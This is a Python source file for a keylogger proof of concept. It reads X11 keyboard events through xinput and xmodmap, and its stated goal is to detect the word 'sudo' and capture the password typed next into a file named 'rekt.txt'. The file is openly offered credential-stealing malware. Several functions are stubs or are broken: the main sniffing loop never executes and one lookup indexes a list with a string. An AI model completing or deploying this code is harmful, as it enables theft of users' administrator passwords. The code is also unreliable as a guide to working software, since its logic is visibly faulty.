### Trivial Keysniffing PoC
import subprocess
import os
import re

class Keysniffer():
        def __init__(self, xinput_bin='/usr/bin/xinput', outfile='rekt.txt'):
               self.xinput = xinput_bin
               self.keycodes = []
               self.outfile = outfile
               self.keyboard = self.getKeyboardID()
        
        def getKeyboardID(self):
                """
                Get the device ID for the keyboard from xinput
                """
                pass

        def getKeyCodes(self):
                """
                Get keycode map using xmodmap and use codes as keys in a dict.
                """
                # Call xmodmap to get keycode mapping, pipe to stdout
                modmap_out = subprocess.Popen(('xmodmap', '-pm', '-pk'), 
                        stdout=subprocess.PIPE,
                        universal_newlines=True
                        )

                # Iterate through output of xmodmap by line, split line into its items,
                # and append that each list of items to codes[] list
                codes = []
                for line in modmap_out.stdout:
                        codes.append(str(line).strip().split())

                # Iterate through the resulting keycode list items
                for line in codes:
                        # Ignore lines with fewer than 2 values (each key from 
                        # xmodmap out has min. of 3 values [code, hex, key])
                        if len(line) < 2:
                                pass
                        else:
                                c1 = str(line[0])
                                # if first item is numeric, its a keycode
                                if c1.isnumeric():
                                        # more than 4 items means there are 2 key values;
                                        # keep both.      
                                        if len(line) > 4: 
                                                code_str = [c1, line[2], line[4]]
                                        else: 
                                                code_str = [c1, line[2]]
                                        
                                        # fill self.keycodes list with resulting list items.
                                        # resulting items will have values in order
                                        # [code, val1, val2]
                                        self.keycodes.append(code_str)


        def codesToKeys(self, codes):
                """
                Take a list of codes and return the resulting string.
                """
                in_buffer = list(codes)
                out_buffer = []
                for item in in_buffer:
                        out_buffer.append(self.keycodes[str(item)])
                
       
        def keysToCodes(self, search):
                """
                Take a string and return a list of each character's keycode
                """
                # iterate through characters in search string, if it is alphanumeric
                # append parentheses to match xmonad format, and append that string to
                # the search_str[] list
                search_str = []
                for char in search:
                        if str(char).isalnum():
                                search_str.append('(' + char + ')')
                        else:
                                pass
                
                # Iterate through each char in the resulting strings from above.
                # Then iterate through the keycode strings: if the char is in the keycode,
                # append keycode[0] (index 0 is the actual code) to result[]
                result = []
                for char in search_str:
                        for code in self.keycodes:
                                if char in code: result.append(code[0])
                return result

        def keySniff(self):
                """
                Execute xinput to begin sniffing keycodes, search for 'sudo' key 
                combination and then capture the input the comes after the next press 
                of 'Enter' up to the next time 'Enter' is pressed.
                """

                # Call xinput to start sniffing keycodes and pipe its output 
                keystream = subprocess.Popen((self.xinput, ), stdout=subprocess.PIPE, 
                        universal_newlines=True)
                
                # Create a list to hold keycodes, fill it with 4 keycodes at a time
                code_buf = []
                while len(code_buf) > 5:
                        for line in keystream.stdout:
                                if "release" in line:
                                        code = str(line).strip().split()
                                        code_buf.append(code[2])
                                else:
                                        continue
                
                



        